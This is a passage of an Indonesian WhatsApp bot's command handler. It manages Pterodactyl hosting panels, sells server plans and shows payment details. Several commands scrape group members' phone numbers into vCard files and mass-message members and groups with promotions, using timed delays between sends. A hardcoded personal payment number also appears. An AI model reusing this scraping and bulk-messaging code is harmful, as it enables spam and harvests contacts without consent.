let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ditss.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ditss.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Ditss.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Ditss.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Ditss.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Ditss.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Ditss.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Ditss.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Ditss.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Ditss.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Ditss.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Ditss.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Ditss.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
//plerrr
case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break
//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Ditss.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Ditss.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Ditss.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Ditss.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana }}, { upload: Ditss.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo }}, { upload: Ditss.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay }}, { upload: Ditss.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: {url: global.image.qris }}, { upload: Ditss.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.image.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtext2})
await Ditss.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA *

* *Nomor :* 081513607731
* *Atas Nama :*

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Ditss.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS *\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Ditss.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Ditss.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case"aditt": case "developerbot": case "owner": {
await Ditss.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Ditss.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Ditss.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
Ditss.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Ditss.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
 const owned11 = owner + "@s.whatsapp.net"
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Ditss.downloadAndSaveMediaMessage(qmsg)
//await Ditss.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})

await Ditss.sendMessage(idSaluran,{image: await fs.readFileSync(img), caption: text,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `asuma md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `photo dari: ${pushname}`,
 body: `message to channel from: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getscs": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
